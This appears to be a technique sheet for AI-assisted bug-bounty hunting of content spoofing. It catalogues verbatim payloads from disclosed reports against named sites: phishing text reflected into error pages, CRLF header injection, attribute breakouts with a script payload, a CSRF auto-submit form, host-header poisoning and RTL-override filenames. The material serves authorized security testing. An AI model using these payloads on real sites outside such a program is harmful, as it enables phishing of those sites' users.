---
name: hunter-l3-content-spoofing
description: "Use when hunting Content Spoofing on a target. Loads the L3 technique sheet: Content spoofing is the injection of attacker-controlled *text or images* into pages served on a trusted domain — no script execution required, just visible content that the victim believes came from the site."
domain: cybersecurity
subdomain: web
tags:
- web
- content-spoofing
- hunting
- l3
version: '1.0'
---

# Content Spoofing — Technique Sheet

## Overview

Content spoofing is the injection of attacker-controlled *text or images* into pages served on a trusted domain — no script execution required, just visible content that the victim believes came from the site. It almost always fires through reflected error/404/403 pages, unescaped query parameters, or filename/fragment reflection, and it pays when the injected text can socially engineer the victim: fake "maintenance, go to evil.com" notices, fake "verify your account" prompts, or fake support/paypal instructions. Individually often low/medium severity, but consistently accepted by programs (Nextcloud, Slack, Reddit, Uber, Khan Academy, Shopify all paid) when the reflection sits on a well-known trusted hostname.

## Distinct sub-patterns

### 1. Path reflection on default error pages (404/403) — the workhorse

The single largest cluster in the records. The web server (often Apache/nginx defaults or the app's error handler) echoes the requested URL path back into the error page body without encoding. Anything after the last meaningful path segment is attacker-controlled visible text.

- Endpoint shape: `GET /{anything}` or `GET /.git/{anything}`, `GET /wp-content/cache/minify/{anything}` on any host that renders a default/custom error page.
- Payloads (verbatim):
  - `https://faspex.uber.com/faspex.uber.com/%2f../It has been changed by a new one http://www.evil.com so go to the new one since this one` (Uber, id=155685)
  - `!!!ATENTION!This_server_is_on_Maintenance_please_go_to_WWW.EVIL.COM` (Sifchain, id=1196253; XVIDEOS, id=2979148; CFP Time, id=474397)
  - `https://multi.xnxx.com/.git/!!!ATENTION!%20This%20server%20is%20on%20Maintenance%20please%20go%20to%20WWW.EVIL.COM` (id=2968559)
  - `https://registration.acronis.com/%20we are facing a heavy traffic, please visit our following website https://www.attacker.com to learn more` (Acronis, id=841630)
  - `https://nextcloud.com/.htacess%20THIS IS CONTENT SPOOFING` (id=145374)
  - Reddit: `https://ads-api.reddit.com//ohhhhhhhhhhh we are facing a heavy traffic, please visit our following website https://www.attacker.com to learn more` (id=1165919); same shape on `gateway-production.dubsmash.com` (id=1166770)
  - Basecamp: type `Click here to verify your account: https://evil.example.com/login` after the slash on gopher.hey.com (id=1245051)
  - Krisp: `<h1>Session expired. Please re-authenticate.</h1>` after the slash on download/upld.prelive.krisp.ai (id=1444031)
  - Tor: `Server is on maintenance, please visit EVIL.ATTACKER.COM` on a torproject.org path (id=273819)
  - Ubiquiti: `has been changed by a new one https://www.ATTACKER.com so go to the new one since this one` on dl-origin.ubnt.com 403 (id=203391)
  - Phabricator: `https://secure.phabricator.com/diffusion/PHU/browse/master/In order to complete the sign up procedure please visit the following link/www.google.com/%3C----Google-----%3E` (id=28792)
  - Nextcloud 403 pages: `https://docs.nextcloud.org/.htacessCONTENT SPOOFING BY AHSAN` (id=145850), `https://updates.nextcloud.org/.htacess%20Content%20Injection%20test` (id=145854), `https://demo.nextcloud.com//this website ----...---- thanks for visiting our website, because we're having some problems` (id=155189, default Apache 403)
- Root cause: error pages render the request URI as plain text; a common trick is prefixing with a dotfile name like `.htaccess` or `.git` to force the 403/404 handler, then appending free text.
- Impact: fake maintenance/outage messages, fake "moved to" notices, fake re-auth prompts on the official hostname — phishing straight off the trusted domain.
- Exemplars: id=155685 (Uber), id=1165919 (Reddit).

### 2. Reflected `error` / `message` query parameters

Explicit message parameters written into the page unescaped — highest quality because the injection lands on a *normal*, functioning page rather than an error page.

- Endpoint shapes:
  - `GET /wp-login.php?error={text}` (WordPress login, id=111094) — payload: `error=Your account has been hacked, Please call us this number 919876543210 OR Drop mail at attacker@mail.com`
  - `GET /studio/forbidden/?message={text}&redirect={path}&path={path}` (Mapbox, id=114529) — message wrote text to the page AND `redirect=/evil.com/` produced a local redirect
  - `GET /services/new/{integration}?error={text}` (Slack, id=22093) — reflected across 48+ integration setup pages
  - `GET /admin/{page}?error={text}` (Shopify, id=58630) — confirmed across orders, products, customers, reports, discounts, apps, settings admin pages
  - `GET /index.php/apps/galleryplus/error?message={text}` (ownCloud, id=87752) — payload: `Welcome to owncloud. You can get pro account by sending us 10 usd directly to our official paypal example@example.com. Thanks.`
- Root cause: template renders the error/message variable without HTML-escaping or prefixing.
- Impact: full attacker message on login/setup/admin surfaces seen by authenticated users.
- Exemplars: id=58630 (Shopify), id=22093 (Slack).

### 3. Search query and functional parameters reflected as page content

- Endpoint shapes and payloads:
  - `GET /search?q={q}` (Gratipay, id=115284): long phishing instructions directing users to a fake login page. Same endpoint with `<h1>Congratulations, you have won a prize!</h1>` (id=154921) — notably, the fix was adding a `Results for:` prefix so query text can't impersonate page content.
  - Weblate `GET /translate/{project}/translations/{lang}/?type={text}` (id=223456, id=223630): `type` reflected into error messages/pages; payload: `You can find here the guide at http://evil.com and test`
  - Nextcloud files app `GET /index.php/apps/files/?dir={text}` (id=145463): `?dir=../../Welcome to Nexcloud You can get pro account by navigating this example.com` — the `../../` bypassed the redirect-to-home so text landed in the breadcrumb UI. Encoded variant (id=154827): `?dir=%2E%2E/%2E%2E/%2E%2E/.well-known/caldav/Error - please restart your computer to continue`
  - WordPress `GET /chanlog.php?day={text}` (id=278151): "today is not found because Wordpress Is Currently Down Kindly Visit Phishing.com..."
  - Weblate contact form `subject` (id=223430): `Account Suspended - Click here to verify`
- Root cause: user input reflected into page body / breadcrumb / error message without escaping or contextual prefix.
- Impact: phishing text on trusted app surfaces; breadcrumb injection especially convincing inside a logged-in UI.
- Exemplars: id=145463, id=223456.

### 4. CRLF injection into error pages / responses

When `%0d%0a` in the path or URL is echoed unencoded, it can break out of the reflected line (or headers) and inject fully attacker-formatted content.

- Payloads (verbatim):
  - Legal Robot (id=164137): `https://www.legalrobot-uat.com/%0D%0AContent-Type%3A text%2Fhtml%0D%0A%0D%0AIt has been changed by a new one https://www.Attacker.com so go to the new one since this one` — injected a Content-Type header plus body text.
  - Yelp (id=179021): `%0ATEXT INJECT` reflected into the rendered 404.
  - Nextcloud (id=222058): `https://demo.nextcloud.com/wp-content/cache/minify/%0d%0ahas moved to www.attacker.com.Please visit attacker.com present resource`
- Root cause: missing custom error page or naive echo of the request URI without CR/LF stripping.
- Impact: attacker text (sometimes with attacker-set content-type) served on the trusted domain.
- Exemplars: id=164137, id=179021.

### 5. Fragment (`#`) and client-side reflection

- Payload (id=222805, Nextcloud): `https://nextcloud.com/federation#xxx@nextcloud.com and please fill your account infomation in http://form.google.com/xasw` — the URL fragment is read by client JS and rendered into the page. Fragments never hit server logs, so these links are hard to detect in defenses and look identical to legit links.

### 6. Parameter-to-DOM reflection in HTML attribute context (breakout via `">`)

- Khan Academy (id=2234420): `GET /districts-demo-form?utm_source={x}&utm_medium={x}` — utm values are inserted inside an `<input ... value="...">` tag unescaped. Payload: `">INJECTED_TEXT` — closing the attribute and tag makes everything after render as visible page content (below the submit button). Same breakout shape (id=153251, Nextcloud admin): `"><script>alert(1)</script>` on a `trustDomain` parameter — confirmed as content spoofing/hardening, low severity, fixed in Nextcloud 11.
- Root cause: values placed into attribute context without HTML-escaping; `">` is the universal breakout.

### 7. Host/header poisoning rendered into page content

- Omise (id=1444675): `GET dashboard.omise.co/test/settings` with header `X-Forwarded-Host: bing.com` — the settings page builds URLs from the header, so a crafted request makes the legitimate settings page display a malicious "account chaining" URL, i.e. phishing recommendations on the real site.

### 8. CSRF-chained content spoofing

- Khan Academy (id=159213): `POST /forgotpw` with `email` param — the forgot-password page reflects the email content into the page and has no CSRF token. Attacker hosts an auto-submitting form:
  ```
  <form action="https://www.khanacademy.org/forgotpw" method="POST">
    <input type="hidden" name="email" value="<the malicious text here>" />
    <input type="hidden" name="reset" value="Reset password" />
  ```
  Victim submitting it sees attacker text injected onto the forgot-password page ("call this number / email us"). Chain: craft POST form → trick victim into submitting → spoofed content displayed.
- This matters because it converts a self-XSS-style reflection into a *delivered* attack — the victim's own browser renders the fake content on the real page.

### 9. Stateful/IDCS parameters carrying attacker message text

- Gratipay email verification (id=117187, id=126010): `GET /~{username}/emails/verify.html?email={text}&nonce={uuid}` — payload (id=126010): `email=your account has expired. You must renew it to use your account. To continue you have to send your login credentials to attacker@mail.com. A Gratipay executive will contact you after that.` Root cause: the email param is reflected into verify.html unsanitized, and (id=117187) the nonce is not bound to the username — an attacker can mint a "valid-looking" verification link for *any* user with arbitrary message text. This is the strongest form of the class: the spoofed content rides on a legitimate, security-looking flow.

### 10. Filename / display-text spoofing via Unicode

- HackerOne (id=298): uploaded filename `insane_in_the_cort‮3pm.exe` — U+202E RTL-override makes the `.exe` display as `exe.3...` disguised as an image/audio file. Payload is the U+202E character itself; root cause is that Unicode override chars aren't stripped from filenames.
- HackerOne homograph (id=143075/id=143975): link `http://ebаy.com/` (Cyrillic а → xn--eby-7cd.com) opened from the show-raw escalate view skips the external-link warning page that normal links get — homograph phishing without the usual interstitial.
- HackerOne warning-page framing (id=60402): the external-link warning renders the target URL as plain text; payload `[Click Here](http://attackers.com/... is a fake website. Click Proceed to visit back HackerOne.)` — attacker *framed sentences* using the URL text itself so the warning page instructs the user to proceed. Root cause: URL displayed unencoded/uncontextualized.

### 11. Attacker-controlled fields inside legitimate emails

- HackerOne invitations (id=92607): program owner controls bug title and program name inserted into invitation email bodies. Chain: create program → set misleading bug title/program name → invite self to get invitation id → send that invitation link to victim. Victim receives a phishing email with a *valid* invitation link on the real domain.

### 12. Unvalidated image source

- Slack (id=2979): `GET /account/photo?url={url}` — payload: an arbitrary image URL (`.../Syrian-Electronic-Army-hacked-CNN.jpg`); the url param becomes the image src unvalidated, letting an attacker display any image on the Slack account page (embarrassing/fake imagery on a trusted page).

### 13. Spoofed "moved to" URLs camouflaged as the domain itself

- CS Money (id=997198): `https://support.cs.money//.cs.money(!has-moved-to-[www.support.cs.money.in]).Please-visit__[www.cs.money.in]___present__resource` — path text crafted so the visible URL *starts with the real domain*, then reads as a "has moved to" notice pointing at the phishing domain. Social-engineering-aware payload design: the victim glancing at the URL bar sees support.cs.money.
- Nextcloud federation-style variants (id=145849): `http://nextcloud.com/has%2f been changed to https://www.ATTACKER.COM. so please visit...` — note the `%2f` inside the text to shape the displayed message.

## Bypass / chain notes

- **Path-prefix tricks to reach error handlers**: `.htaccess`, `.git`, `wp-content/cache/minify/`, `%2f../` — force a 403/404 on a host that otherwise never shows raw error pages, then append free text.
- **Traversal to defeat redirects**: in Nextcloud files `dir`, `../../` (or `%2E%2E/%2E%2E/`) bypassed the redirect-to-home so the text stayed in the page (id=145463, id=154827).
- **CRLF breakout**: `%0d%0a` / `%0A` to terminate the reflected line, inject new content, or even new headers (id=164137 injected `Content-Type: text/html`).
- **`">` attribute-context breakout** when the reflection sits inside an HTML tag (id=2234420).
- **Unicode tricks**: U+202E RTL override in filenames (id=298); homograph/punycode URLs (id=143975).
- **Chains seen**: CSRF → content spoofing on /forgotpw (id=159213); email-verification nonce abuse + reflected email text (id=117187); attacker-controlled fields → phishing email with valid link (id=92607); local open redirect alongside message reflection (Mapbox id=114529); X-Forwarded-Host → poisoned URL displayed on settings page (id=1444675).
- **Fix patterns observed** (tells you what programs consider valid): adding a `Results for:` prefix (id=154921), showing external-link warning interstitials (id=143975/60402).

## Gotchas / what NOT to do

- Do not assume all error-page reflection pays: the same reporter had Sifchain's broken-social-link 404 (id=1188652) rated content-spoofing-only, and Mapbox's external open redirect was *not* accepted as external — only the message reflection was.
- Don't submit plain reflected text on pages that clearly label user input (search results with a "Results for:" prefix) — programs patch exactly this, so a prefixed page means the class is likely already mitigated there.
- Payloads containing `alert(1)`/`<script>` in attribute-breakout contexts (id=153251) get triaged as low/hardening, not XSS — the accepted severity here was content spoofing; don't oversell it.
- Error-page reflection on *internal/prelive* hosts (e.g. `download.prelive.krisp.ai`, `legalrobot-uat.com`) was still accepted, but understand the program may scope it down; on the other hand API hosts (ads-api.reddit.com, gateway-production.dubsmash.com) paid — trust of the hostname matters more than the app type.
- Don't invent external-redirect claims from `redirect=` params unless you reproduce them (Mapbox explicitly reproduced only the local redirect).
- Pre-2017 era reports (Gratipay, Slack, Nextcloud 11) show this class historically; modern programs mostly accept it when the reflection is on a primary trusted domain and the payload reads as a plausible instruction to a non-technical victim.

## Real-world impact examples

- Reddit (id=1165919): "we are facing a heavy traffic, please visit our following website https://www.attacker.com" reflected on ads-api.reddit.com — scam traffic off the official API hostname.
- Shopify (id=58630): reflected `?error=` across all core admin pages (orders, products, customers, reports, discounts, apps, settings) — fake admin notices shown to merchants.
- Slack (id=22093): 48+ integration setup pages reflected attacker error text to all users.
- Khan Academy (id=159213): CSRF-chained injection onto the forgot-password page telling victims to call a number or email the attacker.
- Gratipay (id=117187): attacker-crafted verification link for any username carrying arbitrary text like "You can get pro account by sending us 10 USD through our official paypal example@example.com" — spoofed content inside a genuine account-security flow.
- HackerOne (id=298): `insane_in_the_cort‮3pm.exe` — executable disguised as a media file via RTL override, distributed from the trusted report-attachment domain.
- Nextcloud: the class was confirmed enough to warrant a CVE (CVE-2017-0888, advisory nc-sa-2017-006) plus a hardening fix in the Nextcloud 11 release.